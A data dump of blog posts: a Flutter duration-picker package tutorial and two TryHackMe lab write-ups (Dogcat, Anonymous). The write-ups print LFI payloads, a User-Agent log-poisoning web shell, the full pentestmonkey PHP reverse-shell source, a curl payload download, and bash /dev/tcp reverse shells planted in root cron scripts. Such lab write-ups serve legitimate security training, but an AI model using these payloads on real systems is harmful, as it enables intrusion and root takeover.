Package - Duration Picker","date":"2020-10-19","categories":["flutter","packages"],"content":"\n## What does it do?\n\n- User can easily pick a duration, by turning a rotary slider\n- Returns a duration in form of a Dart \"Duration\" object\n- Features a Material Design\n- It still has some weird behaviours, which will hopefully be fixed in the future\n\n## How to use it?\n\n- First create a new Flutter project the prefered way you like to use.\n\n- Just add it to your pubspec.yaml, either from pub.dev or from github if you want the newest changes as there are some important bugfixes on the Github version that are not on pub.dev\n\n- [pub.dev](https://pub.dev/packages/flutter_duration_picker)\n\n```yaml\ndependencies:\n  flutter_duration_picker:\n    git:\n      url: https://github.com/cdharris/flutter_duration_picker\n```\n\nor\n\n```yaml\ndependencies:\n  flutter_duration_picker: ^1.0.4\n```\n\nThen run\n\n```sh\nflutter pub get\n```\n\nto download the dependency.\nNow import it into your current file with this line of code (or let your IDE / Text Editor do it when needed):\n\n```dart\nimport 'package:flutter_duration_picker/flutter_duration_picker.dart';\n```\n\nAnd then use it like this:\n\n```dart\nimport 'package:flutter/material.dart';\nimport 'package:flutter_duration_picker/flutter_duration_picker.dart';\n\nvoid main() => runApp(MyApp());\n\nclass MyApp extends StatelessWidget {\n  @override\n  Widget build(BuildContext context) {\n    return  MaterialApp(\n      title: 'Duration Picker Demo',\n      home: MyHomePage(),\n    );\n  }\n}\n\nclass MyHomePage extends StatefulWidget {\n  MyHomePage({Key key, this.title}) : super(key: key);\n\n  final String title;\n\n  @override\n  _MyHomePageState createState() => new _MyHomePageState();\n}\n\nclass _MyHomePageState extends State<MyHomePage> {\n  @override\n  Widget build(BuildContext context) {\n    return Scaffold(\n      appBar: AppBar(\n        title: Text(widget.title),\n      ),\n      body: Center(\n        child: DurationPicker(\n            onChange: (duration) {\n              // Gets called every time the picked duration changes | \"duration\" parameter is of type \"Duration\" and contains the current duration\n            },\n            snapToMins: 5.0, // Make the wheel snap to different minute - intervals\n        ),\n      ),\n    );\n  }\n}\n\n```\n\nBasically like any other input widget but you can also use it like that:\n\n```dart\n() async {\n  Duration resultingDuration = await showDurationPicker(\n      context: context,\n      initialTime: new Duration(minutes: 30),\n  );\n\n  // Display the picked duration\n  Scaffold.of(context).showSnackBar(SnackBar(\n    content: Text(\"Chose duration: $resultingDuration\")));\n}\n```\n\nThe \"showDurationPicker()\" method returns a Future<Duration>, so you have to use the \"await\" keyword to use the method result later on.\nWhen calling the method you really just have to pass the context as well as an initial time, which of course depends from usecase to usecase.\n\n## What could you use it for?\n\nI used it in an app where the user could create his own recipe library and of course for a recipe you need to know how long it takes to make it. So when the user enters a new recipe I use the duration picker to get the time it takes to make the recipe. This way I can also pretty easily and uniformly display a duration later on, compared to a simple text field, where every user may enter a duration in a different unit, so seconds or hours, or with \":\" or without. And this list goes on and on. This small widget solves all of these problems and more.\n\nHave a look at the source code of the app I mentioned [here](https://github.com/ecrax/recipe_library) if you want to see how I implemented this widget into an application [(here)](https://github.com/ecrax/recipe_library/blob/97c2edadbef63a21799a9023bce2856245058f46/lib/screens/add_recipe_screen.dart#L286).\n","id":1220100134533,"slug":"Flutter-Package-Duration-Picker"},{"title":"Dogcat - TryHackMe","date":"2020-07-11","categories":["pentesting","writeups"],"content":"\r\nHey there! Today I am going to walk you through the Dogcat machine on [TryHackMe](https://tryhackme.com/room/dogcat)\r\n\r\nThe first thing I always do is to export the IP to a global variable. So from now on \\$IP will refer to the IP of the target machine.\r\n\r\n```bash\r\nexport IP={Machine IP}\r\n```\r\n\r\n## Enumeration\r\n\r\nSo as always let‚Äôs start with an nmap scan.\r\n\r\n```bash\r\nnmap -sC -sV -oN nmap/initial\r\n```\r\n\r\nThis is what came back:\r\n\r\n```plain\r\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-10 06:27 EDT\r\nNmap scan report for 10.10.39.107\r\nHost is up (0.045s latency).\r\nNot shown: 998 closed ports\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey:\r\n|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)\r\n|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)\r\n|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)\r\n80/tcp open  http    Apache httpd 2.4.38 ((Debian))\r\n|_http-server-header: Apache/2.4.38 (Debian)\r\n|_http-title: dogcat\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n\r\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\r\nNmap done: 1 IP address (1 host up) scanned in 10.88 seconds\r\n```\r\n\r\nSo as we can see, there is a webserver on port 80 and a ssh access. We should first have a look at the webserver, as we can‚Äôt really do anything to the shh port at the moment.\r\n\r\n## Gaining Access\r\n\r\nWe are greeted with a webpage about dog and cat pictures. If we click on one of the buttons we get either a picture of a dog or a cat respectively. On first glance there is no obvious entry point we could exploit, but if we have a look at the URL we should notice somehthing.\r\n\r\n```bash\r\nhttp://$IP/?view=dog\r\n```\r\n\r\nOnce we clicked on a button the URL has a view parameter with ‚Äúdog‚Äù or ‚Äúcat‚Äù assigned. I instantly thought of Local File Inclusion (LFI), so let‚Äôs try something:\r\n\r\n```bash\r\nhttp://$IP/?view=..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd\r\n```\r\n\r\nBut sadly the developer of the webpage took care of that and checks wether or not ‚Äúdog‚Äù or ‚Äúcat‚Äù is in the value of the view parameter, so once we write ‚Äúdog‚Äù somewhere in the path, we see this:\r\n\r\n{% asset_img lfi.png %}\r\n\r\nApparently warnings were not disabled in the php settings, so we can see that there was an error in the ‚Äúinclude()‚Äù function. We can also see that the contents of the view parameter are being passed straight into that function, and that they automatically append a .php extension, somewhere in the code.\r\n\r\nSo what can we do with this information? We need to find a way to exfiltrate information from that webpage. I came accross [this](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) website. Let‚Äôs try this:\r\n\r\n{% asset_img lfi2.png %}\r\n\r\nAwesome it worked!\r\n\r\nOf course this is still base64, but we can easily decode that online for example [here](https://www.base64decode.org/).<br/>Just to recap, we used this URL:\r\n\r\n```bash\r\nhttp://$IP/?view=php://filter/convert.base64-encode/resource=./dog/../index\r\n```\r\n\r\nTo show the code of the index page, encoded in base64. If we deocde this, we can see the source code of the index page, which let‚Äôs us see what is going on under the hood.\r\n\r\nThe exfiltrated code:\r\n\r\n```php\r\n<!DOCTYPE HTML>\r\n<html>\r\n\r\n<head>\r\n    <title>dogcat</title>\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/style.css\">\r\n</head>\r\n\r\n<body>\r\n    <h1>dogcat</h1>\r\n    <i>a gallery of various dogs or cats</i>\r\n\r\n    <div>\r\n        <h2>What would you like to see?</h2>\r\n        <a href=\"/?view=dog\"><button id=\"dog\">A dog</button></a> <a href=\"/?view=cat\"><button id=\"cat\">A cat</button></a><br>\r\n        <?php\r\n            function containsStr($str, $substr) {\r\n                return strpos($str, $substr) !== false;\r\n            }\r\n\t    $ext = isset($_GET[\"ext\"]) ? $_GET[\"ext\"] : '.php';\r\n            if(isset($_GET['view'])) {\r\n                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {\r\n                    echo 'Here you go!';\r\n                    include $_GET['view'] . $ext;\r\n                } else {\r\n                    echo 'Sorry, only dogs or cats are allowed.';\r\n                }\r\n            }\r\n        ?>\r\n    </div>\r\n</body>\r\n\r\n</html>\r\n```\r\n\r\nIf you don‚Äôt know php, here is what it basically does:<br/>It checks if there is a ‚Äúext‚Äù parameter in the URL. If there is not, it uses a .php extension and else it uses whatever it was given in the URL. Then of course it includes whatever file is specified in the view parameter, with the given extension.\r\n\r\nWith this knowledge we can things like this:\r\n\r\n```bash\r\nhttp://10.10.39.107/?view=php://filter/resource=./dog/../../../../../../../etc/passwd&amp;ext=\r\n```\r\n\r\nTo extraxt the linux password file:\r\n\r\n```plain\r\nroot:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\r\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\r\nsync:x:4:65534:sync:/bin:/bin/sync\r\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\r\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\r\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\r\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\r\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\r\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\r\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\r\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\r\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\r\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\r\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\r\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\r\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\r\n```\r\n\r\nSadly we can not find any passwords or anything else interesting here, so we have to dig deeper.\r\n\r\nThe next thing we should try is log poisining. We are really just injecting a pice of php code into the log, to get remote code execution. Let‚Äôs first check where the log is. From our nmap scan we know that it is an apache2 server. So just try all the default locations. This is where I found it:\r\n\r\n```bash\r\nhttp://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=\r\n```\r\n\r\nThis is a snippet of the log:\r\n\r\n```plain\r\n{YOUR_IP} - - [10/Jul/2020:10:27:35 +0000] \"GET /cats/4.jpg HTTP/1.1\" 200 17994 \"http://$IP/?view=cat\" \"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\"\r\n```\r\n\r\nIt‚Äôs syntax is like this:\r\n\r\n**{ACCESSING_IP} - - [TIME] ‚Äú{REQUEST}‚Äù {RESPONSE_CODE} {I_DUNNO} ‚Äú{URL}‚Äù ‚Äú{USER_AGENT}‚Äù**\r\n\r\nThe part we can modify to display php code, is the User Agent.\r\n\r\nYou can either do this with a python script or with Burp-Suite.<br/>Here is the python script:\r\n\r\n```python\r\nimport requests\r\n\r\nurl = 'http://$IP/?view=cat'\r\n\r\nheaders = {\r\n    'User-Agent': '<?php system($_GET['cmd']); ?>',\r\n}\r\n\r\nresponse = requests.get(url, headers=headers)\r\n\r\nprint(response.text)\r\n```\r\n\r\nBut I did it with Burp as well.\r\n\r\nIf you want a more detailed description just google how to edit a User Agent with Burp-Suite.\r\n\r\n{% asset_img burp.png %}\r\n\r\nWe now have remote code execution, by passing a linux command to the ‚Äúcmd‚Äù paramter in the URL. We can see the results of that command if we open up the log file again. So if we try to run ‚Äúwhoami‚Äù like this:\r\n\r\n```bash\r\nhttp://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=whoami\r\n```\r\n\r\nWe can see this result in the logs (To find it more quickly the next time, copy the time stamp where the result of the whoami command showed up and search for it the next time. Then you will jump to the correct line automatically):\r\n\r\n{% asset_img logpoisining.png %}\r\n\r\nAs expected we are ‚Äúwww-data‚Äù.\r\n\r\n## Post Exploitation\r\n\r\n### Flag 1\r\n\r\nTo get an overview of what we are working with let‚Äôs also run ‚Äúls -l‚Äù.\r\n\r\n```bash\r\nhttp://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=ls%20-l\r\n```\r\n\r\n{% asset_img flag1.png %}\r\n\r\nOh hey, there we have our first flag! We can see the content of the file like this:\r\n\r\n```bash\r\nhttp://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=cat%20flag.php\r\n```\r\n\r\n**It is in the current working directory (/var/www/html/)**\r\n\r\nThe result:\r\n\r\n{% asset_img flag1.1.png %}\r\n\r\n### Flag 2\r\n\r\nThe second flag is pretty much as easy as the first one, it is just one directory up.\r\n\r\n**One up from the current directory (/var/www/)**\r\n\r\n```bash\r\nhttp://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=ls%20-l%20..\r\n```\r\n\r\n{% asset_img flag2.png %}\r\n\r\n```bash\r\nhttp://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=cat ../flag2_QMW7JvaY2LvK.txt\r\n```\r\n\r\n{% asset_img flag2.2.png %}\r\n\r\nFor the 3rd and 4th flag we will need a proper reverse shell with root access. I couldn‚Äôt get a shell by running a reverse shell from the [PentestMonkey-ReverseShell-CheatSheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), like this:\r\n\r\n```bash\r\nhttp://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=php -r '$sock=fsockopen(\"{TUN0}\"\",9999);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\r\n```\r\n\r\nMaybe it was just me, but I decided to just download a php reverse shell from my computer with curl.\r\n\r\nFor that I used [this](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) reverse shell and modified it with my ip and the 9999 port.\r\n\r\n```php\r\n<?php\r\n// php-reverse-shell - A Reverse Shell implementation in PHP\r\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\r\n//\r\n// This tool may be used for legal purposes only.  Users take full responsibility\r\n// for any actions performed using this tool.  The author accepts no liability\r\n// for damage caused by this tool.  If these terms are not acceptable to you, then\r\n// do not use this tool.\r\n//\r\n// In all other respects the GPL version 2 applies:\r\n//\r\n// This program is free software; you can redistribute it and/or modify\r\n// it under the terms of the GNU General Public License version 2 as\r\n// published by the Free Software Foundation.\r\n//\r\n// This program is distributed in the hope that it will be useful,\r\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n// GNU General Public License for more details.\r\n//\r\n// You should have received a copy of the GNU General Public License along\r\n// with this program; if not, write to the Free Software Foundation, Inc.,\r\n// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\r\n//\r\n// This tool may be used for legal purposes only.  Users take full responsibility\r\n// for any actions performed using this tool.  If these terms are not acceptable to\r\n// you, then do not use this tool.\r\n//\r\n// You are encouraged to send comments, improvements or suggestions to\r\n// me at pentestmonkey@pentestmonkey.net\r\n//\r\n// Description\r\n// -----------\r\n// This script will make an outbound TCP connection to a hardcoded IP and port.\r\n// The recipient will be given a shell running as the current user (apache normally).\r\n//\r\n// Limitations\r\n// -----------\r\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\r\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\r\n// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\r\n//\r\n// Usage\r\n// -----\r\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\r\n\r\nset_time_limit (0);\r\n$VERSION = \"1.0\";\r\n$ip = '';  // Your tun0 ip (ifconfig in terminal)\r\n$port = 9999;\r\n$chunk_size = 1400;\r\n$write_a = null;\r\n$error_a = null;\r\n$shell = 'uname -a; w; id; /bin/sh -i';\r\n$daemon = 0;\r\n$debug = 0;\r\n\r\n//\r\n// Daemonise ourself if possible to avoid zombies later\r\n//\r\n\r\n// pcntl_fork is hardly ever available, but will allow us to daemonise\r\n// our php process and avoid zombies.  Worth a try...\r\nif (function_exists('pcntl_fork')) {\r\n\t// Fork and have the parent process exit\r\n\t$pid = pcntl_fork();\r\n\r\n\tif ($pid == -1) {\r\n\t\tprintit(\"ERROR: Can't fork\");\r\n\t\texit(1);\r\n\t}\r\n\r\n\tif ($pid) {\r\n\t\texit(0);  // Parent exits\r\n\t}\r\n\r\n\t// Make the current process a session leader\r\n\t// Will only succeed if we forked\r\n\tif (posix_setsid() == -1) {\r\n\t\tprintit(\"Error: Can't setsid()\");\r\n\t\texit(1);\r\n\t}\r\n\r\n\t$daemon = 1;\r\n} else {\r\n\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\r\n}\r\n\r\n// Change to a safe directory\r\nchdir(\"/\");\r\n\r\n// Remove any umask we inherited\r\numask(0);\r\n\r\n//\r\n// Do the reverse shell...\r\n//\r\n\r\n// Open reverse connection\r\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\r\nif (!$sock) {\r\n\tprintit(\"$errstr ($errno)\");\r\n\texit(1);\r\n}\r\n\r\n// Spawn shell process\r\n$descriptorspec = array(\r\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\r\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\r\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\r\n);\r\n\r\n$process = proc_open($shell, $descriptorspec, $pipes);\r\n\r\nif (!is_resource($process)) {\r\n\tprintit(\"ERROR: Can't spawn shell\");\r\n\texit(1);\r\n}\r\n\r\n// Set everything to non-blocking\r\n// Reason: Occsionally reads will block, even though stream_select tells us they won't\r\nstream_set_blocking($pipes[0], 0);\r\nstream_set_blocking($pipes[1], 0);\r\nstream_set_blocking($pipes[2], 0);\r\nstream_set_blocking($sock, 0);\r\n\r\nprintit(\"Successfully opened reverse shell to $ip:$port\");\r\n\r\nwhile (1) {\r\n\t// Check for end of TCP connection\r\n\tif (feof($sock)) {\r\n\t\tprintit(\"ERROR: Shell connection terminated\");\r\n\t\tbreak;\r\n\t}\r\n\r\n\t// Check for end of STDOUT\r\n\tif (feof($pipes[1])) {\r\n\t\tprintit(\"ERROR: Shell process terminated\");\r\n\t\tbreak;\r\n\t}\r\n\r\n\t// Wait until a command is end down $sock, or some\r\n\t// command output is available on STDOUT or STDERR\r\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\r\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\r\n\r\n\t// If we can read from the TCP socket, send\r\n\t// data to process's STDIN\r\n\tif (in_array($sock, $read_a)) {\r\n\t\tif ($debug) printit(\"SOCK READ\");\r\n\t\t$input = fread($sock, $chunk_size);\r\n\t\tif ($debug) printit(\"SOCK: $input\");\r\n\t\tfwrite($pipes[0], $input);\r\n\t}\r\n\r\n\t// If we can read from the process's STDOUT\r\n\t// send data down tcp connection\r\n\tif (in_array($pipes[1], $read_a)) {\r\n\t\tif ($debug) printit(\"STDOUT READ\");\r\n\t\t$input = fread($pipes[1], $chunk_size);\r\n\t\tif ($debug) printit(\"STDOUT: $input\");\r\n\t\tfwrite($sock, $input);\r\n\t}\r\n\r\n\t// If we can read from the process's STDERR\r\n\t// send data down tcp connection\r\n\tif (in_array($pipes[2], $read_a)) {\r\n\t\tif ($debug) printit(\"STDERR READ\");\r\n\t\t$input = fread($pipes[2], $chunk_size);\r\n\t\tif ($debug) printit(\"STDERR: $input\");\r\n\t\tfwrite($sock, $input);\r\n\t}\r\n}\r\n\r\nfclose($sock);\r\nfclose($pipes[0]);\r\nfclose($pipes[1]);\r\nfclose($pipes[2]);\r\nproc_close($process);\r\n\r\n// Like print, but does nothing if we've daemonised ourself\r\n// (I can't figure out how to redirect STDOUT like a proper daemon)\r\nfunction printit ($string) {\r\n\tif (!$daemon) {\r\n\t\tprint \"$string\\n\";\r\n\t}\r\n}\r\n\r\n?>\r\n```\r\n\r\nThen I opened a http server in the directory I had the modified php shell:\r\n\r\n```python\r\npython -m http.server\r\n```\r\n\r\nThen download the file with curl:\r\n\r\n```bash\r\nhttp://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=curl -o shell.php {TUN0}:8000/shell.php\r\n```\r\n\r\nBefore we open the file, we have to listen for incoming connection on the port we defined in the php shell on our machine:\r\n\r\n```bash\r\nnc -lnvp {PORT}\r\n```\r\n\r\nThen open the shell on the server:\r\n\r\n```bash\r\nhttp://$IP/shell.php\r\n```\r\n\r\nSadly we can‚Äôt stabilize that shell with some poor mans pentest, because python is not installed.\r\n\r\n## Getting Root\r\n\r\nLet‚Äôs just run some code to see if there are some SUIDs we can run:\r\n\r\n```bash\r\nsudo -l\r\n```\r\n\r\nAs you can see we can run /usr/bin/env with no password.\r\n\r\n{% asset_img sudo.png %}\r\n\r\nGive it a search on GTFOBins to see how we can get a root shell:\r\n\r\n{% asset_img gtfobins.png %}\r\n\r\nAnd there you go, you got a root shell!\r\n\r\n{% asset_img whoamiroot.png %}\r\n\r\n### Flag 3\r\n\r\nThe 3rd flag is in the **/root** directory. You can just cat it out, just like the previous ones.\r\n\r\n{% asset_img flag3.png %}\r\n\r\n### Flag 4\r\n\r\nThe problem with the 4th flag is, that it is outside of this container. This might sound confusing, but the essence is, is that we just have to get another shell.\r\n\r\nIn /opt/backups we can se that there is a backup script that is run regularly to generate a backup.tar file. Let‚Äôs use this to genreate another reverse shell outside of this container.\r\n\r\nWe can easily exploit, that this script is run every other minute with root privileges, by inserting some code that will generate a reverse connection to us.<br/>To insert this code into the script, simply run this:\r\n\r\n```bash\r\necho \"#!/bin/bash\" > /opt/backups/backup.sh\r\necho \"/bin/bash -c 'bash -i >& /dev/tcp/{TUN0}/8888 0>&1'\" >> /opt/backups/backup.sh\r\n```\r\n\r\nAnd listen on port 8888 on your machine:\r\n\r\n```bash\r\nnc -lnvp 8888\r\n```\r\n\r\nNow wait a few seconds (or minutes, for me it took just a few seconds) and you get another root shell.\r\n\r\n{% asset_img secondRootShell.png %}\r\n\r\nThe fourth flag is in **/root/flag4.txt**\r\n\r\n{% asset_img flag4.png %}\r\n\r\n## The End\r\n\r\nAnd there you have it! I hope you had fun, I know I did ü¶Ñ\r\n","id":1468634987283,"slug":"Dogcat-TryHackMe"},{"title":"Anonymous - TryHackMe","date":"2020-08-13","categories":["pentesting","writeups"],"content":"\r\nHello there! Today I am going to walk you through the Anonymous machine on [TryHackMe](https://tryhackme.com/room/anonymous).\r\n\r\nLet‚Äôs first (as always) export the IP to a global variable, for easier reference later on. So when ever you see \\$IP I am talking about the machines IP.\r\n\r\n```bash\r\nexport IP={Machine IP}\r\n```\r\n\r\n![test](\\Anonymous-TryHackMe\\flag3.png)\r\n![test](\\Anonymous-TryHackMe\\flag4.png)\r\n\r\n## Enumeration\r\n\r\nLet‚Äôs get started with an nmap scan:\r\n\r\n```plain\r\nnmap -T4 -A -p- $IP\r\n```\r\n\r\nThose are the results:\r\n\r\n```plain\r\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 13:27 EDT\r\nNmap scan report for 10.10.115.205\r\nHost is up (0.096s latency).\r\nNot shown: 996 closed ports\r\nPORT    STATE SERVICE     VERSION\r\n21/tcp  open  ftp         vsftpd 2.0.8 or later\r\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r\n|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]\r\n| ftp-syst:\r\n|   STAT:\r\n| FTP server status:\r\n|      Connected to ::ffff:10.9.25.68\r\n|      Logged in as ftp\r\n|      TYPE: ASCII\r\n|      No session bandwidth limit\r\n|      Session timeout in seconds is 300\r\n|      Control connection is plain text\r\n|      Data connections will be plain text\r\n|      At session startup, client count was 1\r\n|      vsFTPd 3.0.3 - secure, fast, stable\r\n|_End of status\r\n22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey:\r\n|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)\r\n|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)\r\n|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)\r\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r\n445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\r\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\r\nTCP/IP fingerprint:\r\nOS:SCAN(V=7.80%E=4%D=8/9%OT=21%CT=1%CU=35520%PV=Y%DS=2%DC=T%G=Y%TM=5F303224\r\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=F9%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O\r\nOS:1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11N\r\nOS:W6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R\r\nOS:=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%\r\nOS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y\r\nOS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R\r\nOS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=\r\nOS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S\r\nOS:)\r\n\r\nNetwork Distance: 2 hops\r\nService Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n\r\nHost script results:\r\n|_clock-skew: mean: -2s, deviation: 1s, median: -2s\r\n|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\r\n| smb-os-discovery:\r\n|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\r\n|   Computer name: anonymous\r\n|   NetBIOS computer name: ANONYMOUS\\x00\r\n|   Domain name: \\x00\r\n|   FQDN: anonymous\r\n|_  System time: 2020-08-09T17:27:57+00:00\r\n| smb-security-mode:\r\n|   account_used: guest\r\n|   authentication_level: user\r\n|   challenge_response: supported\r\n|_  message_signing: disabled (dangerous, but default)\r\n| smb2-security-mode:\r\n|   2.02:\r\n|_    Message signing enabled but not required\r\n| smb2-time:\r\n|   date: 2020-08-09T17:27:57\r\n|_  start_date: N/A\r\n\r\nTRACEROUTE (using port 80/tcp)\r\nHOP RTT       ADDRESS\r\n1   41.06 ms  10.9.0.1\r\n2   114.16 ms 10.10.115.205\r\n\r\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\r\nNmap done: 1 IP address (1 host up) scanned in 33.36 seconds\r\n```\r\n\r\nWe can already see that there are three interesting services running. SMB, FTP and SSH. I chose to have a look at SMB first and then work my way up.<br/>In the scan results we can see that guest login is allowed, so let‚Äôs make use of that.\r\n\r\nFirst I used SMBMap to see what share we could access:\r\n\r\n```plain\r\nroot@hades      :~# smbmap $IP\r\n[+] Guest session       IP: 10.10.115.205:445   Name: 10.10.115.205\r\n        Disk                                                    Permissions Comment\r\n    ----                                                    ----------- -------\r\n    print$                                              NO ACCESS   Printer Drivers\r\n    pics                                                READ ONLY   My SMB Share Directory for Pics\r\n    IPC$                                                NO ACCESS   IPC Service (anonymous server (Samba, Ubuntu))\r\n```\r\n\r\nThe ‚Äúpics‚Äù share seems interesting, but apparently this was a rabbit hole, there were literally just a few pictures on there.\r\n\r\nSo let‚Äôs move on to the next port. It is an FTP server with anonymous login enabled (always look closely at you scan results). I just logged in with the command line, like this:\r\n\r\n```plain\r\nroot@hades      :~/ctf/thm/anonymous# ftp 10.10.115.205 21\r\nConnected to 10.10.115.205.\r\n220 NamelessOne's FTP Server!\r\nName (10.10.115.205:root): anonymous\r\n331 Please specify the password.\r\nPassword:\r\n230 Login successful.\r\nRemote system type is UNIX.\r\nUsing binary mode to transfer files.\r\nftp>\r\n```\r\n\r\nAs the password I entered nothing and just pressed enter. We can move around the FTP server just like on a Linux machine and after looking around for a bit, I found three files:\r\n\r\n```plain\r\nftp> ls\r\n200 PORT command successful. Consider using PASV.\r\n150 Here comes the directory listing.\r\ndrwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts\r\n226 Directory send OK.\r\nftp> cd scripts\r\n250 Directory successfully changed.\r\nftp> ls\r\n200 PORT command successful. Consider using PASV.\r\n150 Here comes the directory listing.\r\n-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh\r\n-rw-rw-r--    1 1000     1000         1763 Aug 09 17:45 removed_files.log\r\n-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt\r\n```\r\n\r\nYou can easily download them with ‚Äúget‚Äù and then the file name (get [‚ÄòFile name‚Äô]).\r\n\r\n## Gaining Access\r\n\r\nOnly the bash script really is interesting for us. The todo just says to remove the anonymous login and the log is being generated by the clean.sh script. The script itself deletes all files from the /tmp directory, when run. Potentially this is a cron job?<br/>A cron job is something you can set up on your Linux machine to do tasks e.g. daily, monthly etc.\r\n\r\nSo if we can override the script we can let it do whatever we want (Spoiler: we can).\r\n\r\nJust create a shell scipt and insert some kind of shell. I used this simple reverse shell, just insert you own IP:\r\n\r\n```bash\r\n#!/bin/bash\r\n\r\nbash -i >& /dev/tcp/[Your tun0 IP]/8080 0>&1\r\n```\r\n\r\nAnd upload it with ‚Äúput‚Äù and then the file name of the local file.\r\n\r\nThen set up a netcat listener on you machine:\r\n\r\n```bash\r\nnc -lnvp 